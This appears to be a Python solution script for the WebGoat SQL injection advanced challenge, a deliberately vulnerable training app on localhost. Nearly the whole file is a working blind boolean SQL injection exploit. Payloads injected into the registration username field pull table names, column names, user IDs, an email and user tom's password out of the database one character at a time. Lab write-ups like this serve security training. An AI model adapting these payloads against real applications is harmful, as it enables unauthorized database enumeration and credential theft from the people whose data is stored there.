import json, requests  
def my_script():  
     Tables=[]
     T = ''
     letter_range = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@.'
     cookie = {  
        'Cookie': 'JSESSIONID=mU_vNfdPO9hkUfBvFx08reNsqb3V1qWEuN52KoiR',  
     }
     # ENTER THE CORRECT JSESSION ID ABOVE!
     
     for num in range(0,2): # modify this range for different use-cases
         table = 1
         Tables.append(T)
         T = ''
         index = 0  
         while True: # un-comment only the 'query' for the case you want
 
             # to find out all the tables in the database - SET RANGE (0,124)
             #query = 'tom\' AND (substring((select TABLE_NAME from INFORMATION_SCHEMA.TABLES LIMIT 1 OFFSET {}),{},1 ) LIKE \'{}\');--'.format(num,table,letter_range[index])
             
             # to find out tables with a 'password' column - SET RANGE (0,6)
             #query = 'tom\' AND (substring((select TABLE_NAME from INFORMATION_SCHEMA.COLUMNS where COLUMN_NAME = \'PASSWORD\' LIMIT 1 OFFSET {}),{},1) LIKE \'{}\'); --'.format(num,table,letter_range[index])
             
             # to find out columns of target table - SET RANGE (0,4)
             #query = 'tom\' AND (substring((select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\'CHALLENGE_USERS\' LIMIT 1 OFFSET {}),{},1 ) LIKE \'{}\');--'.format(num,table,letter_range[index])
             
             # to find out all users in target table - SET RANGE (0,5)
             #query = 'tom\' AND (substring((select USERID from CHALLENGE_USERS LIMIT 1 OFFSET {}),{},1 ) LIKE \'{}\');--'.format(num,table,letter_range[index])
             
             # to find out user tom's email - SET RANGE (0,2)
             #query = 'tom\' AND (substring((select EMAIL from CHALLENGE_USERS where USERID=\'tom\' LIMIT 1 OFFSET {}),{},1 ) LIKE \'{}\');--'.format(num,table,letter_range[index])
             
             # to find out user tom's password - SET RANGE (0,2)
             query = 'tom\' AND (substring((select PASSWORD from CHALLENGE_USERS where USERID=\'tom\' LIMIT 1 OFFSET {}),{},1 ) LIKE \'{}\');--'.format(num,table,letter_range[index])    
             
             params = {  
                 'username_reg': query,  
                 'email_reg': 'a@b.c',  
                 'password_reg': 'a',  
                 'confirm_password_reg': 'a'  
             }  
             # found out the data fields names from Inspect in browser
             Req = requests.put('http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge', headers=cookie, data=params)
             
             try:  
                 response = json.loads(Req.text)  
             except:  
                 print("Check the JSESSIONID once again!")  
                 exit()    
             if "already exists" not in response['feedback']:  
                 index += 1  
                 if index > len(letter_range) - 1:  break  
             else:  
                 T += letter_range[index]  
                 table+=1
                 index = 0  

     for i in Tables:
         if i != '': print(i)
my_script()